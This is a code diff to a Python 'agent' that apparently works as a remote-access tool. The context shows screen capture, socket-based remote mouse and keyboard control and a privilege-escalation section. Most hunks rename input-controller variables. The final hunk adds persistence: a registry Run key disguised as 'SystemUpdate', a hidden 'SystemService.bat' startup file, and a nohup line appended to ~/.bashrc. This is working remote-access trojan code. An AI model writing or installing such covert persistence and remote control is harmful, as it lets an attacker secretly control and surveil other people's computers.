@@ -46,6 +46,8 @@ import random
 import mss
 import numpy as np
 import cv2
+from collections import defaultdict
+import queue
 try:
     import win32api
     import win32con
@@ -119,6 +121,14 @@ sio = socketio.Client(
     engineio_logger=False,
     socketio_logger=False
 )
+
+# --- Input Controllers ---
+mouse_controller = None
+keyboard_controller = None
+
+# --- High-Performance Components ---
+high_performance_capture = None
+low_latency_input = None
 
 # --- Privilege Escalation Functions ---
 
@@ -2411,21 +2421,20 @@ def stop_voice_control():
 # Global variables for remote control
 REMOTE_CONTROL_ENABLED = False
 LOW_LATENCY_INPUT_HANDLER = None
-MOUSE_CONTROLLER = None
-KEYBOARD_CONTROLLER = None
+# Removed duplicate controller variables - using mouse_controller and keyboard_controller instead
 
 def initialize_low_latency_input():
     """Initialize the low-latency input handler"""
     global LOW_LATENCY_INPUT_HANDLER
     
     try:
-        from low_latency_input import LowLatencyInputHandler
+        # Use the LowLatencyInputHandler class defined in this file
         LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
         LOW_LATENCY_INPUT_HANDLER.start()
         print("Low-latency input handler initialized")
         return True
-    except ImportError:
-        print("Low-latency input handler not available, using fallback")
+    except Exception as e:
+        print(f"Low-latency input handler not available, using fallback: {e}")
         return False
     except Exception as e:
         print(f"Failed to initialize low-latency input: {e}")
@@ -2453,16 +2462,16 @@ def handle_remote_control(command_data):
 
 def _handle_remote_control_fallback(command_data):
     """Fallback remote control handling (original implementation optimized)"""
-    global MOUSE_CONTROLLER, KEYBOARD_CONTROLLER
+    global mouse_controller, keyboard_controller
     
     # Import here to avoid conflicts
     from pynput import mouse, keyboard
     
     # Initialize controllers if needed
-    if MOUSE_CONTROLLER is None:
-        MOUSE_CONTROLLER = mouse.Controller()
-    if KEYBOARD_CONTROLLER is None:
-        KEYBOARD_CONTROLLER = keyboard.Controller()
+    if mouse_controller is None:
+        mouse_controller = mouse.Controller()
+    if keyboard_controller is None:
+        keyboard_controller = keyboard.Controller()
     
     try:
         action = command_data.get("action")
@@ -2510,7 +2519,7 @@ def handle_mouse_move(data):
         abs_y = int(y * screen_height * sensitivity)
         
         # Move mouse
-        MOUSE_CONTROLLER.position = (abs_x, abs_y)
+        mouse_controller.position = (abs_x, abs_y)
         
     except Exception as e:
         print(f"Error handling mouse move: {e}")
@@ -2521,11 +2530,11 @@ def handle_mouse_click(data):
         button = data.get("button", "left")
         
         if button == "left":
-            MOUSE_CONTROLLER.click(mouse.Button.left, 1)
+            mouse_controller.click(mouse.Button.left, 1)
         elif button == "right":
-            MOUSE_CONTROLLER.click(mouse.Button.right, 1)
+            mouse_controller.click(mouse.Button.right, 1)
         elif button == "middle":
-            MOUSE_CONTROLLER.click(mouse.Button.middle, 1)
+            mouse_controller.click(mouse.Button.middle, 1)
             
     except Exception as e:
         print(f"Error handling mouse click: {e}")
@@ -2539,48 +2548,48 @@ def handle_key_down(data):
         if key:
             # Map special keys
             if key == "Enter":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.enter)
+                keyboard_controller.press(keyboard.Key.enter)
             elif key == "Escape":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.esc)
+                keyboard_controller.press(keyboard.Key.esc)
             elif key == "Backspace":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.backspace)
+                keyboard_controller.press(keyboard.Key.backspace)
             elif key == "Tab":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.tab)
+                keyboard_controller.press(keyboard.Key.tab)
             elif key == "Shift":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.shift)
+                keyboard_controller.press(keyboard.Key.shift)
             elif key == "Control":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.ctrl)
+                keyboard_controller.press(keyboard.Key.ctrl)
             elif key == "Alt":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.alt)
+                keyboard_controller.press(keyboard.Key.alt)
             elif key == "Delete":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.delete)
+                keyboard_controller.press(keyboard.Key.delete)
             elif key == "Home":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.home)
+                keyboard_controller.press(keyboard.Key.home)
             elif key == "End":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.end)
+                keyboard_controller.press(keyboard.Key.end)
             elif key == "PageUp":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.page_up)
+                keyboard_controller.press(keyboard.Key.page_up)
             elif key == "PageDown":
-                KEYBOARD_CONTROLLER.press(keyboard.Key.page_down)
+                keyboard_controller.press(keyboard.Key.page_down)
             elif key.startswith("Arrow"):
                 direction = key[5:].lower()  # Remove "Arrow" prefix
                 if direction == "up":
-                    KEYBOARD_CONTROLLER.press(keyboard.Key.up)
+                    keyboard_controller.press(keyboard.Key.up)
                 elif direction == "down":
-                    KEYBOARD_CONTROLLER.press(keyboard.Key.down)
+                    keyboard_controller.press(keyboard.Key.down)
                 elif direction == "left":
-                    KEYBOARD_CONTROLLER.press(keyboard.Key.left)
+                    keyboard_controller.press(keyboard.Key.left)
                 elif direction == "right":
-                    KEYBOARD_CONTROLLER.press(keyboard.Key.right)
+                    keyboard_controller.press(keyboard.Key.right)
             elif key.startswith("F") and key[1:].isdigit():
                 # Function keys
                 f_num = int(key[1:])
                 if 1 <= f_num <= 12:
                     f_key = getattr(keyboard.Key, f"f{f_num}")
-                    KEYBOARD_CONTROLLER.press(f_key)
+                    keyboard_controller.press(f_key)
             elif len(key) == 1:
                 # Regular character
-                KEYBOARD_CONTROLLER.press(key)
+                keyboard_controller.press(key)
                 
     except Exception as e:
         print(f"Error handling key down: {e}")
@@ -2594,48 +2603,48 @@ def handle_key_up(data):
         if key:
             # Map special keys
             if key == "Enter":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.enter)
+                keyboard_controller.release(keyboard.Key.enter)
             elif key == "Escape":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.esc)
+                keyboard_controller.release(keyboard.Key.esc)
             elif key == "Backspace":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.backspace)
+                keyboard_controller.release(keyboard.Key.backspace)
             elif key == "Tab":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.tab)
+                keyboard_controller.release(keyboard.Key.tab)
             elif key == "Shift":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.shift)
+                keyboard_controller.release(keyboard.Key.shift)
             elif key == "Control":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.ctrl)
+                keyboard_controller.release(keyboard.Key.ctrl)
             elif key == "Alt":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.alt)
+                keyboard_controller.release(keyboard.Key.alt)
             elif key == "Delete":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.delete)
+                keyboard_controller.release(keyboard.Key.delete)
             elif key == "Home":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.home)
+                keyboard_controller.release(keyboard.Key.home)
             elif key == "End":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.end)
+                keyboard_controller.release(keyboard.Key.end)
             elif key == "PageUp":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.page_up)
+                keyboard_controller.release(keyboard.Key.page_up)
             elif key == "PageDown":
-                KEYBOARD_CONTROLLER.release(keyboard.Key.page_down)
+                keyboard_controller.release(keyboard.Key.page_down)
             elif key.startswith("Arrow"):
                 direction = key[5:].lower()  # Remove "Arrow" prefix
                 if direction == "up":
-                    KEYBOARD_CONTROLLER.release(keyboard.Key.up)
+                    keyboard_controller.release(keyboard.Key.up)
                 elif direction == "down":
-                    KEYBOARD_CONTROLLER.release(keyboard.Key.down)
+                    keyboard_controller.release(keyboard.Key.down)
                 elif direction == "left":
-                    KEYBOARD_CONTROLLER.release(keyboard.Key.left)
+                    keyboard_controller.release(keyboard.Key.left)
                 elif direction == "right":
-                    KEYBOARD_CONTROLLER.release(keyboard.Key.right)
+                    keyboard_controller.release(keyboard.Key.right)
             elif key.startswith("F") and key[1:].isdigit():
                 # Function keys
                 f_num = int(key[1:])
                 if 1 <= f_num <= 12:
                     f_key = getattr(keyboard.Key, f"f{f_num}")
-                    KEYBOARD_CONTROLLER.release(f_key)
+                    keyboard_controller.release(f_key)
             elif len(key) == 1:
                 # Regular character
-                KEYBOARD_CONTROLLER.release(key)
+                keyboard_controller.release(key)
                 
     except Exception as e:
         print(f"Error handling key up: {e}")
@@ -5601,6 +5610,100 @@ def on_key_press(data):
             })
     except Exception as e:
         print(f"Error simulating key press: {e}")
+
+def initialize_components():
+    """Initialize high-performance components and input controllers."""
+    global high_performance_capture, low_latency_input, mouse_controller, keyboard_controller
+    
+    # Initialize input controllers
+    try:
+        mouse_controller = pynput.mouse.Controller()
+        keyboard_controller = pynput.keyboard.Controller()
+        print("Input controllers initialized")
+    except Exception as e:
+        print(f"Failed to initialize input controllers: {e}")
+    
+    # Initialize high-performance capture
+    try:
+        high_performance_capture = HighPerformanceCapture(
+            target_fps=60,
+            quality=85,
+            enable_delta_compression=True
+        )
+        print("High-performance capture initialized")
+    except Exception as e:
+        print(f"Failed to initialize high-performance capture: {e}")
+        high_performance_capture = None
+    
+    # Initialize low-latency input handler
+    try:
+        low_latency_input = LowLatencyInputHandler()
+        low_latency_input.start()
+        print("Low-latency input handler initialized")
+    except Exception as e:
+        print(f"Failed to initialize low-latency input: {e}")
+        low_latency_input = None
+
+def add_to_startup():
+    """Add agent to system startup."""
+    try:
+        if WINDOWS_AVAILABLE:
+            # Windows startup methods
+            add_registry_startup()
+            add_startup_folder_entry()
+        else:
+            # Linux startup methods
+            add_linux_startup()
+    except Exception as e:
+        print(f"Startup configuration failed: {e}")
+
+def add_registry_startup():
+    """Add to Windows registry startup."""
+    try:
+        import winreg
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
+                              r"Software\Microsoft\Windows\CurrentVersion\Run")
+        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
+                         f'"{sys.executable}" "{os.path.abspath(__file__)}"')
+        winreg.CloseKey(key)
+        print("Added to registry startup")
+    except Exception as e:
+        print(f"Registry startup failed: {e}")
+
+def add_startup_folder_entry():
+    """Add to Windows startup folder."""
+    try:
+        startup_folder = os.path.join(os.environ["APPDATA"], 
+                                    "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        batch_file = os.path.join(startup_folder, "SystemService.bat")
+        
+        with open(batch_file, "w") as f:
+            f.write(f'@echo off\nstart "" "{sys.executable}" "{os.path.abspath(__file__)}"\n')
+        
+        # Hide the file
+        try:
+            subprocess.run(["attrib", "+h", batch_file], capture_output=True)
+        except:
+            pass
+        print("Added to startup folder")
+    except Exception as e:
+        print(f"Startup folder entry failed: {e}")
+
+def add_linux_startup():
+    """Add to Linux startup."""
+    try:
+        # Add to .bashrc
+        bashrc_path = os.path.expanduser("~/.bashrc")
+        startup_line = f"nohup {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1 &\n"
+        
+        # Check if already added
+        with open(bashrc_path, "r") as f:
+            if startup_line not in f.read():
+                with open(bashrc_path, "a") as f:
+                    f.write(startup_line)
+                print("Added to Linux startup")
+    except Exception as e:
+        print(f"Linux startup configuration failed: {e}")
 
 def agent_main():
     """Main function for agent mode (original main functionality)."""
